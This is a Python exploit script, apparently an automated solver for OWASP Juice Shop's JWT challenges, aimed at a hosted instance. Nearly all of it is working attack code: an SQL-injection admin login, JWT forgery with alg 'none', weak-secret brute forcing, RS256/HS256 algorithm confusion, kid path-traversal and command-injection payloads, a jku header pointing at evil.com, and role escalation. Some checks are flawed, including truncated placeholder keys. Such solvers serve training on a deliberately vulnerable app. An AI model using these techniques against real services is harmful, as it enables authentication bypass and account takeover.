#!/usr/bin/env python3
"""
Advanced JWT Manipulation Solver - Exploits JWT vulnerabilities
"""

import base64
import hashlib
import hmac
import json
import jwt
import requests
import time
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend


class JWTAdvancedSolver:
    """Advanced JWT manipulation techniques"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.auth_token = None
        
    def login_admin(self):
        """Admin login to get valid JWT"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            self.auth_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.auth_token}'
            print("✅ Admin logged in, JWT obtained")
            return self.auth_token
        return None
        
    def decode_jwt(self, token):
        """Decode JWT without verification"""
        parts = token.split('.')
        if len(parts) != 3:
            return None, None
            
        # Add padding if needed
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        
        return header, payload
        
    def exploit_none_algorithm(self):
        """Unsigned JWT - Change algorithm to 'none'"""
        print("🎯 Unsigned JWT (alg: none)...")
        
        if not self.auth_token:
            return
            
        header, payload = self.decode_jwt(self.auth_token)
        if not header or not payload:
            return
            
        # Change algorithm to none
        header['alg'] = 'none'
        header['typ'] = 'JWT'
        
        # Encode without signature
        new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        # JWT with no signature
        forged_token = f"{new_header}.{new_payload}."
        
        # Test forged token
        self.session.headers['Authorization'] = f'Bearer {forged_token}'
        r = self.session.get(f"{self.base_url}/rest/user/whoami")
        
        if r.status_code == 200:
            print("  ✅ Unsigned JWT successful!")
        else:
            print("  ❌ Unsigned JWT failed")
            
    def exploit_weak_secret(self):
        """Brute force weak JWT secret"""
        print("🎯 Weak Secret Brute Force...")
        
        if not self.auth_token:
            return
            
        # Common weak secrets
        weak_secrets = [
            'secret', 'password', 'admin', 'key', 'jwt', 
            'juice-shop', 'juiceshop', 'owasp', 'test',
            'secret123', 'password123', 'admin123', 'jwt123',
            'HS256', 'RS256', 'public', 'private'
        ]
        
        header, payload = self.decode_jwt(self.auth_token)
        if not header or not payload:
            return
            
        for secret in weak_secrets:
            try:
                # Try to sign with potential secret
                forged = jwt.encode(payload, secret, algorithm='HS256')
                
                # Test token
                self.session.headers['Authorization'] = f'Bearer {forged}'
                r = self.session.get(f"{self.base_url}/rest/user/whoami")
                
                if r.status_code == 200:
                    print(f"  ✅ Found secret: {secret}")
                    break
            except:
                pass
                
    def exploit_algorithm_confusion(self):
        """Algorithm confusion attack - RS256 to HS256"""
        print("🎯 Algorithm Confusion (RS256 -> HS256)...")
        
        if not self.auth_token:
            return
            
        header, payload = self.decode_jwt(self.auth_token)
        if not header or not payload:
            return
            
        # Common public keys to try
        public_keys = [
            b'public',
            b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA\n-----END PUBLIC KEY-----',
            b'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC',
        ]
        
        # Change algorithm to HS256
        header['alg'] = 'HS256'
        
        for pub_key in public_keys:
            try:
                # Sign with public key as HMAC secret
                new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                
                signature = base64.urlsafe_b64encode(
                    hmac.new(pub_key, f"{new_header}.{new_payload}".encode(), hashlib.sha256).digest()
                ).decode().rstrip('=')
                
                forged = f"{new_header}.{new_payload}.{signature}"
                
                # Test token
                self.session.headers['Authorization'] = f'Bearer {forged}'
                r = self.session.get(f"{self.base_url}/rest/user/whoami")
                
                if r.status_code == 200:
                    print("  ✅ Algorithm confusion successful!")
                    break
            except:
                pass
                
    def exploit_kid_injection(self):
        """Key ID (kid) injection attack"""
        print("🎯 Key ID Injection...")
        
        if not self.auth_token:
            return
            
        header, payload = self.decode_jwt(self.auth_token)
        if not header or not payload:
            return
            
        # Various kid injection payloads
        kid_payloads = [
            "../../../dev/null",
            "/dev/null",
            "|/usr/bin/id",
            "../../../../../../dev/null",
            "AAA/../../../dev/null",
        ]
        
        for kid in kid_payloads:
            try:
                header['kid'] = kid
                header['alg'] = 'HS256'
                
                # Sign with empty secret (from /dev/null)
                new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                
                signature = base64.urlsafe_b64encode(
                    hmac.new(b'', f"{new_header}.{new_payload}".encode(), hashlib.sha256).digest()
                ).decode().rstrip('=')
                
                forged = f"{new_header}.{new_payload}.{signature}"
                
                # Test token
                self.session.headers['Authorization'] = f'Bearer {forged}'
                r = self.session.get(f"{self.base_url}/rest/user/whoami")
                
                if r.status_code == 200:
                    print(f"  ✅ KID injection successful with: {kid}")
                    break
            except:
                pass
                
    def exploit_jku_bypass(self):
        """JKU (JSON Web Key Set URL) bypass"""
        print("🎯 JKU Bypass...")
        
        if not self.auth_token:
            return
            
        header, payload = self.decode_jwt(self.auth_token)
        if not header or not payload:
            return
            
        # Add malicious JKU
        header['jku'] = 'http://evil.com/jwks.json'
        header['alg'] = 'RS256'
        
        # Generate new RSA key pair
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        
        # Sign with our private key
        try:
            forged = jwt.encode(payload, private_key, algorithm='RS256', headers=header)
            
            # Test token
            self.session.headers['Authorization'] = f'Bearer {forged}'
            r = self.session.get(f"{self.base_url}/rest/user/whoami")
            
            if r.status_code == 200:
                print("  ✅ JKU bypass successful!")
        except:
            pass
            
    def exploit_exp_bypass(self):
        """Expiration time bypass"""
        print("🎯 Expiration Bypass...")
        
        if not self.auth_token:
            return
            
        header, payload = self.decode_jwt(self.auth_token)
        if not header or not payload:
            return
            
        # Modify expiration times
        payload['exp'] = int(time.time()) + 31536000  # 1 year from now
        payload['iat'] = int(time.time())
        payload['nbf'] = int(time.time()) - 3600
        
        # Try different signing methods
        header['alg'] = 'none'
        
        new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        forged = f"{new_header}.{new_payload}."
        
        # Test token
        self.session.headers['Authorization'] = f'Bearer {forged}'
        r = self.session.get(f"{self.base_url}/rest/user/whoami")
        
        if r.status_code == 200:
            print("  ✅ Expiration bypass successful!")
            
    def exploit_privilege_escalation(self):
        """JWT privilege escalation"""
        print("🎯 Privilege Escalation...")
        
        # First login as regular user
        r = self.session.post(
            f"{self.base_url}/api/Users",
            json={
                "email": f"test{int(time.time())}@test.com",
                "password": "password123",
                "passwordRepeat": "password123",
                "securityQuestion": {"id": 1},
                "securityAnswer": "test"
            }
        )
        
        # Login as new user
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": f"test{int(time.time())}@test.com", "password": "password123"}
        )
        
        if r.status_code == 200:
            user_token = r.json()['authentication']['token']
            header, payload = self.decode_jwt(user_token)
            
            if header and payload:
                # Escalate privileges
                payload['data']['role'] = 'admin'
                payload['data']['email'] = 'admin@juice-sh.op'
                payload['bid'] = 1  # Admin basket ID
                
                # Sign with none algorithm
                header['alg'] = 'none'
                
                new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                
                forged = f"{new_header}.{new_payload}."
                
                # Test escalated token
                self.session.headers['Authorization'] = f'Bearer {forged}'
                r = self.session.get(f"{self.base_url}/#/administration")
                
                if r.status_code == 200:
                    print("  ✅ Privilege escalation successful!")
                    
    def run_all_jwt_exploits(self):
        """Execute all JWT exploits"""
        print("="*60)
        print("🔑 JWT ADVANCED SOLVER")
        print("="*60)
        
        # Get initial token
        self.login_admin()
        
        # Run all exploits
        self.exploit_none_algorithm()
        self.exploit_weak_secret()
        self.exploit_algorithm_confusion()
        self.exploit_kid_injection()
        self.exploit_jku_bypass()
        self.exploit_exp_bypass()
        self.exploit_privilege_escalation()
        
        # Check results
        print("\n" + "="*60)
        
        # Reset to valid token for final check
        self.login_admin()
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            total = len(data)
            solved = len([c for c in data if c.get('solved')])
            print(f"📊 Score after JWT exploits: {solved}/{total} ({solved*100//total}%)")
            
        print("="*60)


if __name__ == "__main__":
    solver = JWTAdvancedSolver()
    solver.run_all_jwt_exploits()